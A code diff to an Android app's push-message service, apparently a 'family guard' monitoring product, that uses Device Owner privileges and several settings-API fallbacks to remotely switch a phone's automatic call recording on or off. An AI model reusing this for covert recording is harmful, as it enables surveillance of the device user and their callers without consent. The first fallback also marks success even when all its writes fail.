@@ -1565,48 +1565,99 @@ class FcmService : FirebaseMessagingService() {
      * and can be extended for Samsung, Xiaomi, etc.
      */
     private fun toggleSystemAutoCallRecord(enable: Boolean) {
-        val value = if (enable) 1 else 0
+        val value = if (enable) "1" else "0"
+        val valueInt = if (enable) 1 else 0
+        var success = false
+        
         try {
-            // Method 1: Use Settings.System API (works if WRITE_SETTINGS permission granted)
-            val cr = contentResolver
-            try {
-                android.provider.Settings.System.putInt(cr, "call_record_auto", value)
-                android.provider.Settings.System.putInt(cr, "vivo_call_record_auto", value)
-                Log.w(TAG, "System auto-record toggled via Settings.System API: enable=$enable")
-                return
-            } catch (e: SecurityException) {
-                Log.w(TAG, "Settings.System API failed (no WRITE_SETTINGS): ${e.message}")
-            }
+            val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
             
-            // Method 2: Use shell command (Device Owner can execute)
-            try {
-                val process1 = Runtime.getRuntime().exec(arrayOf("sh", "-c", "settings put system call_record_auto $value"))
-                process1.waitFor()
-                val process2 = Runtime.getRuntime().exec(arrayOf("sh", "-c", "settings put system vivo_call_record_auto $value"))
-                process2.waitFor()
-                
-                // Verify
-                val verify = Runtime.getRuntime().exec(arrayOf("sh", "-c", "settings get system call_record_auto"))
-                val result = verify.inputStream.bufferedReader().readText().trim()
-                verify.waitFor()
-                
-                Log.w(TAG, "System auto-record toggled via shell: enable=$enable, verify=$result")
-            } catch (e: Exception) {
-                Log.e(TAG, "Shell toggle failed: ${e.message}")
-            }
-            
-            // Method 3: Device Owner can grant WRITE_SETTINGS then retry
-            try {
-                val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
-                if (doManager.isDeviceOwner()) {
-                    doManager.grantPermission(android.Manifest.permission.WRITE_SETTINGS)
-                    android.provider.Settings.System.putInt(cr, "call_record_auto", value)
-                    android.provider.Settings.System.putInt(cr, "vivo_call_record_auto", value)
-                    Log.w(TAG, "System auto-record toggled via DO + WRITE_SETTINGS: enable=$enable")
+            // Method 1: DevicePolicyManager.setSecureSetting (Device Owner API)
+            // This is the most reliable for Device Owner - can write secure settings
+            if (!success && doManager.isDeviceOwner()) {
+                try {
+                    val dpm = getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    val adminComponent = android.content.ComponentName(this@FcmService, com.familyguardpro.services.DeviceAdminReceiver::class.java)
+                    
+                    // Try secure settings first (Vivo may store here)
+                    try {
+                        dpm.setSecureSetting(adminComponent, "call_record_auto", value)
+                        Log.w(TAG, "Set secure call_record_auto=$value via DPM")
+                    } catch (e: Exception) {
+                        Log.w(TAG, "DPM setSecureSetting call_record_auto failed: ${e.message}")
+                    }
+                    try {
+                        dpm.setSecureSetting(adminComponent, "vivo_call_record_auto", value)
+                        Log.w(TAG, "Set secure vivo_call_record_auto=$value via DPM")
+                    } catch (e: Exception) {
+                        Log.w(TAG, "DPM setSecureSetting vivo_call_record_auto failed: ${e.message}")
+                    }
+                    
+                    // Also try global settings
+                    try {
+                        dpm.setGlobalSetting(adminComponent, "call_record_auto", value)
+                        Log.w(TAG, "Set global call_record_auto=$value via DPM")
+                    } catch (e: Exception) {
+                        Log.w(TAG, "DPM setGlobalSetting call_record_auto failed: ${e.message}")
+                    }
+                    try {
+                        dpm.setGlobalSetting(adminComponent, "vivo_call_record_auto", value)
+                        Log.w(TAG, "Set global vivo_call_record_auto=$value via DPM")
+                    } catch (e: Exception) {
+                        Log.w(TAG, "DPM setGlobalSetting vivo_call_record_auto failed: ${e.message}")
+                    }
+                    
+                    success = true
+                } catch (e: Exception) {
+                    Log.w(TAG, "DPM settings approach failed: ${e.message}")
                 }
-            } catch (e: Exception) {
-                Log.w(TAG, "DO WRITE_SETTINGS approach failed: ${e.message}")
             }
+            
+            // Method 2: ContentResolver with Settings.Secure (Device Owner has WRITE_SECURE_SETTINGS)
+            if (!success) {
+                try {
+                    val cr = contentResolver
+                    android.provider.Settings.Secure.putInt(cr, "call_record_auto", valueInt)
+                    android.provider.Settings.Secure.putInt(cr, "vivo_call_record_auto", valueInt)
+                    Log.w(TAG, "Set via Settings.Secure API: enable=$enable")
+                    success = true
+                } catch (e: Exception) {
+                    Log.w(TAG, "Settings.Secure API failed: ${e.message}")
+                }
+            }
+            
+            // Method 3: ContentResolver with Settings.System 
+            if (!success) {
+                try {
+                    val cr = contentResolver
+                    android.provider.Settings.System.putInt(cr, "call_record_auto", valueInt)
+                    android.provider.Settings.System.putInt(cr, "vivo_call_record_auto", valueInt)
+                    Log.w(TAG, "Set via Settings.System API: enable=$enable")
+                    success = true
+                } catch (e: Exception) {
+                    Log.w(TAG, "Settings.System API failed: ${e.message}")
+                }
+            }
+            
+            // Method 4: ContentResolver with Settings.Global
+            if (!success) {
+                try {
+                    val cr = contentResolver
+                    android.provider.Settings.Global.putInt(cr, "call_record_auto", valueInt)
+                    android.provider.Settings.Global.putInt(cr, "vivo_call_record_auto", valueInt)
+                    Log.w(TAG, "Set via Settings.Global API: enable=$enable")
+                    success = true
+                } catch (e: Exception) {
+                    Log.w(TAG, "Settings.Global API failed: ${e.message}")
+                }
+            }
+
+            // Verify the setting was changed
+            val verifySystem = android.provider.Settings.System.getInt(contentResolver, "call_record_auto", -1)
+            val verifySecure = android.provider.Settings.Secure.getInt(contentResolver, "call_record_auto", -1)
+            val verifyGlobal = android.provider.Settings.Global.getInt(contentResolver, "call_record_auto", -1)
+            Log.w(TAG, "toggleSystemAutoCallRecord verify: system=$verifySystem, secure=$verifySecure, global=$verifyGlobal, wanted=$valueInt, success=$success")
+            
         } catch (e: Exception) {
             Log.e(TAG, "toggleSystemAutoCallRecord failed: ${e.message}")
         }
